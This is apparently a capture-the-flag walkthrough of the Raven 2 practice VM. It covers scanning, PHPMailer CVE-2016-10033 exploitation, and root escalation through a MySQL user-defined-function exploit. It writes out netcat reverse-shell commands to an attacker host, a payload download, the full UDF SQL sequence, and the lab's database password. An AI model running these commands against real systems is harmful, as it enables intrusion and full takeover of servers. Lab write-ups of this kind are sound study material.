# raven 2 : 11.0.0.20



## In brief
- nmap -> port 80
- dirb : find browsable directory http://11.0.0.20/vendor/
- http://11.0.0.20/vendor/SECURITY.md : phpmail is used
- PHPMail 5.2.16
- [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033)
- remote shell
- mysql run as root
- mysql credential in /var/www/html/wordpress/wp-config.php
- mysl version is 5.5.60-0+deb8u1
- use mysql UDF exploit
- root



## [nmap -sC -sV -p- 11.0.0.20]
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-18 15:42 CET
Nmap scan report for raven.local (11.0.0.20)
Host is up (0.000071s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33493/udp  status
|_  100024  1          56255/tcp  status
56255/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:C3:6E:71 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
```


## [nikto]
```
# nikto -host 11.0.0.20
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          11.0.0.20
+ Target Hostname:    11.0.0.20
+ Target Port:        80
+ Start Time:         2019-02-18 15:44:02 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x41b3 0x5734482bdcb00 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ 7517 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2019-02-18 15:44:25 (GMT1) (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## [80: /img]: checked

## [80: /.DS_store]: checked
$ strings DS_store: Nothing usefull 

## [80: http://11.0.0.20/wordpress/index.php/wp-json/]
WP API
http://raven.local/wordpress/index.php/wp-json/wp/v2/users/1


## [80: /wordpress]
Version 3.3.1
Users
- steven  : id=2 ? admin ? Not allowed to request his profile
- michael : id=1

```
# wpscan --url http://11.0.0.20/wordpress 
Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir

=> Browse manually
http://11.0.0.20/wordpress/index.php/2018/08/12/hello-world/
No use of 'wp-content' => use '.'

# wpscan --url http://11.0.0.20/wordpress --wp-content-dir .
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.3.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://11.0.0.20/wordpress/
[+] Started: Mon Feb 18 15:43:07 2019

Interesting Finding(s):

[+] http://11.0.0.20/wordpress/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://11.0.0.20/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://11.0.0.20/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.8.7 identified.
 | Detected By: Emoji Settings (Passive Detection)
 |  - http://11.0.0.20/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://11.0.0.20/wordpress/, Match: 'WordPress 4.8.7'
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.8.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a

[i] The main theme could not be detected.

[+] Enumerating All Plugins

[i] No plugins Found.

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 <================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Finished: Mon Feb 18 15:43:09 2019
[+] Requests Done: 38
[+] Memory used: 54.184 MB
[+] Elapsed time: 00:00:02
```

```
# wpscan --url http://11.0.0.20/wordpress --wp-content-dir . -e u
[..]
[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] steven
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] michael
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### [http://11.0.0.20/wordpress/wp-includes/ID3/]
Tested LFI: ko
http://11.0.0.20/wordpress/wp-includes/ID3/getid3.php?include=license.txt



### [dirbuster]

http:11.0.0.20
Wordlist : /usr/share/wordlist/dirbuster/middlexxx

http://11.0.0.20/wordpress/wp-content/uploads/2018/11/flag3.png


### [dirb]

http://11.0.0.20/vendor
PHPMail 5.2.16

http://11.0.0.20/vendor/PATH
/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}

http://11.0.0.20/vendor/VERSION
5.2.16

http://11.0.0.20/vendor/SECURITY.md
List CVE
[CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033)
The following Sender address:
"Attacker -Param2 -Param3"@test.com
would cause PHPMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:
Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

"Attacker \" -Param2 -Param3"@test.com
when passed to PHPMailer (and eventually to mail()) function would cause
sendmail to execute with:
Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

__The contact form is bugged.__
Forms sent to mail.php if 404 not found.
The real url is contact.php, the contact page itself.

https://www.exploit-db.com/exploits/40974
Add : # coding: utf-8
Set 11.0.0.20/contact.php as target
Upload the TCP reverse shell
Open the nc : nc -l -p 4444
Call the shell : http://11.0.0.20/shell.php 

=> remote shell


# nc -lnvp 1234
get http://11.0.0.20/backdoor.php?cmd=nc 11.0.0.21 1234 -e /bin/bash


### [hydra] : ko
cat users.txt
steven
michael

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt

Aborted.. too long, no results

## [ Remote shell]

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


$ pwd
/var/www/html

$ $ bash
ls -al
total 196
drwxrwxrwx 10 root     root      4096 Feb 19 05:51 .
drwxrwxrwx  3 root     root      4096 Nov  9 08:16 ..
-rw-r--r--  1 root     root     18436 Aug 12  2018 .DS_Store
drwxr-xr-x  7 root     root      4096 Aug 12  2018 Security - Doc  <==>
-rw-r--r--  1 root     root     13265 Aug 13  2018 about.html
-rw-r--r--  1 root     root     10441 Aug 13  2018 contact.php
-rw-r--r--  1 root     root      3384 Aug 12  2018 contact.zip     <== ko
drwxr-xr-x  4 root     root      4096 Aug 12  2018 css
-rw-r--r--  1 root     root     35226 Aug 12  2018 elements.html
drwxr-xr-x  2 root     root      4096 Aug 12  2018 fonts
drwxr-xr-x  5 root     root      4096 Aug 12  2018 img
-rw-r--r--  1 root     root     16819 Aug 13  2018 index.html
drwxr-xr-x  3 root     root      4096 Aug 12  2018 js
drwxr-xr-x  4 root     root      4096 Aug 12  2018 scss
-rw-r--r--  1 root     root     11114 Nov  9 08:16 service.html
-rw-r--r--  1 www-data www-data 17255 Feb 19 05:51 shell.php
-rw-r--r--  1 root     root     15449 Aug 13  2018 team.html
drwxrwxrwx  7 root     root      4096 Aug 13  2018 vendor
drwxrwxrwx  5 root     root      4096 Nov  9 08:20 wordpress



### [http://11.0.0.20/Security%20-%20Doc/]

$ find / -name "*.txt"
/var/www/html/vendor/docs/DomainKeys_notes.txt
/var/www/flag2.txt
$ cat /var/www/flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}

### [Local enum - privile escalation ]
```
$ find / -perm -4000 -print 2>/dev/null
/bin/mount
/bin/umount
/bin/su
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/sensible-mda
/sbin/mount.nfs

$ ps -eaf | grep root
root         1     0  0 01:32 ?        00:00:01 /sbin/init
root         2     0  0 01:32 ?        00:00:00 [kthreadd]
root         3     2  0 01:32 ?        00:00:05 [ksoftirqd/0]
root         5     2  0 01:32 ?        00:00:00 [kworker/0:0H]
root         7     2  0 01:32 ?        00:00:03 [rcu_sched]
root         8     2  0 01:32 ?        00:00:00 [rcu_bh]
root         9     2  0 01:32 ?        00:00:00 [migration/0]
root        10     2  0 01:32 ?        00:00:00 [watchdog/0]
root        11     2  0 01:32 ?        00:00:00 [khelper]
root        12     2  0 01:32 ?        00:00:00 [kdevtmpfs]
root        13     2  0 01:32 ?        00:00:00 [netns]
root        14     2  0 01:32 ?        00:00:00 [khungtaskd]
root        15     2  0 01:32 ?        00:00:00 [writeback]
root        16     2  0 01:32 ?        00:00:00 [ksmd]
root        17     2  0 01:32 ?        00:00:00 [crypto]
root        18     2  0 01:32 ?        00:00:00 [kintegrityd]
root        19     2  0 01:32 ?        00:00:00 [bioset]
root        20     2  0 01:32 ?        00:00:00 [kblockd]
root        22     2  0 01:32 ?        00:00:01 [kswapd0]
root        23     2  0 01:32 ?        00:00:00 [vmstat]
root        24     2  0 01:32 ?        00:00:00 [fsnotify_mark]
root        30     2  0 01:32 ?        00:00:00 [kthrotld]
root        31     2  0 01:32 ?        00:00:00 [ipv6_addrconf]
root        32     2  0 01:32 ?        00:00:00 [deferwq]
root        33     2  0 01:32 ?        00:00:00 [kworker/u2:1]
root        66     2  0 01:32 ?        00:00:00 [khubd]
root        67     2  0 01:32 ?        00:00:00 [ata_sff]
root        68     2  0 01:32 ?        00:00:00 [kpsmoused]
root        71     2  0 01:32 ?        00:00:00 [mpt_poll_0]
root        72     2  0 01:32 ?        00:00:00 [mpt/0]
root        73     2  0 01:32 ?        00:00:00 [scsi_eh_0]
root        74     2  0 01:32 ?        00:00:00 [scsi_tmf_0]
root        75     2  0 01:32 ?        00:00:00 [kworker/u2:2]
root        78     2  0 01:32 ?        00:00:00 [kworker/0:1H]
root        80     2  0 01:32 ?        00:00:00 [scsi_eh_1]
root        81     2  0 01:32 ?        00:00:00 [scsi_tmf_1]
root        82     2  0 01:32 ?        00:00:00 [scsi_eh_2]
root        83     2  0 01:32 ?        00:00:00 [scsi_tmf_2]
root       104     2  0 01:32 ?        00:00:00 [jbd2/sda1-8]
root       105     2  0 01:32 ?        00:00:00 [ext4-rsv-conver]
root       136     2  0 01:32 ?        00:00:00 [kauditd]
root       137     1  0 01:32 ?        00:00:04 /lib/systemd/systemd-journald
root       147     1  0 01:32 ?        00:00:00 /lib/systemd/systemd-udevd
root       375     1  0 01:32 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       398     1  0 01:32 ?        00:00:00 /sbin/rpcbind -w
root       412     2  0 01:32 ?        00:00:00 [rpciod]
root       414     2  0 01:32 ?        00:00:00 [nfsiod]
root       421     1  0 01:32 ?        00:00:00 /usr/sbin/rpc.idmapd
root       422     1  0 01:32 ?        00:00:00 /usr/sbin/cron -f
root       426     1  0 01:32 ?        00:00:00 /lib/systemd/systemd-logind
root       467     1  0 01:32 ?        00:00:01 /usr/sbin/rsyslogd -n
root       469     1  0 01:32 ?        00:00:00 /usr/sbin/acpid
root       473     1  0 01:32 ?        00:00:00 /usr/sbin/sshd -D
root       475     1  0 01:32 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
root       527     1  0 01:32 ?        00:00:00 sendmail: MTA: accepting connections          
root       538     1  0 01:32 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root       586     1  0 01:32 ?        00:00:01 /usr/sbin/apache2 -k start
root       907   538  0 01:32 ?        00:00:10 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      1148     2  0 01:47 ?        00:00:05 [kworker/0:0]
root      3975     2  0 06:06 ?        00:00:00 [kworker/0:1]
www-data  4069  3930  0 06:21 ?        00:00:00 grep root
```
___=> mysql run as root___

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
michael:x:1000:1000:michael,,,:/home/michael:/bin/bash
smmta:x:108:114:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:109:115:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
steven:x:1001:1001::/home/steven:/bin/sh

$ find /var -name "wp-config*"
/var/www/html/wordpress/wp-config.php

$ cat /var/www/html/wordpress/wp-config.php

define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '0&ItXmn^q2d[e*yB:9,L:rR<B`h+DG,zQ&SN{Or3zalh.JE+Q!Gi:L7U[(T:J5ay');
define('SECURE_AUTH_KEY',  'y@^[*q{)NKZAKK{,AA4y-Ia*swA6/O@&*r{+RS*N!p1&a$*ctt+ I/!?A/Tip(BG');
define('LOGGED_IN_KEY',    '.D4}RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&/F7SBSLPlj');
define('NONCE_KEY',        '4L{Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&46');
define('AUTH_SALT',        '@@?u*YKtt:o/T&V;cbb`.GaJ0./S@dn$t2~n+lR3{PktK]2,*y/b%<BH-Bd#I}oE');
define('SECURE_AUTH_SALT', 'f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$& mn=]=/cvd');
define('LOGGED_IN_SALT',   '}STRHqy,4scy7v >-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@');
define('NONCE_SALT',       'i(#~[sXA TbJJfdn&D;0bd`p$r,~.o/?%m<H+<>Vj+,nLvX!-jjjV-o6*HDh5Td{');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');


```

### [mysql]
/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306

$  mysql -u "root" "-pR@v3nSecurity" wordpress
\! ls -l
select load_file("/etc/passwd");
.. ok
load_file("/etc/shadow");
.. ko
SELECT VERSION() ;
5.5.60-0+deb8u1

MySQL is 5.5, we can use the popular EDB-ID 1518 user-defined function or UDF.
https://www.exploit-db.com/exploits/1518
https://github.com/mysqludf/lib_mysqludf_sys

$ uname -a
Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

__.so must be 64 bits.__

$ apt install libmariadb-dev
$ apt install libmariadb-dev-compat 
Modify includes in .c
gcc -Wall -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c
# readelf -Ws lib_mysqludf_sys.so | grep sys_exec


set an http server : # python -m SimpleHTTPServer 80

get from victim : wget http://11.0.0.21/lib_mysqludf_sys.so
mv lib_mysqludf_sys.so /tmp

$ mysql -Dmysql -uroot -p'R@v3nSecurity'
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname 'lib_mysqludf_sys.so';
select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');

# nc -lnvp 4444
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag4.txt
  ___                   ___ ___ 
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | | 
 |_|_\__,_|\_/\___|_||_|___|___|
                           
flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM




https://hackso.me/raven-2-walkthrough/
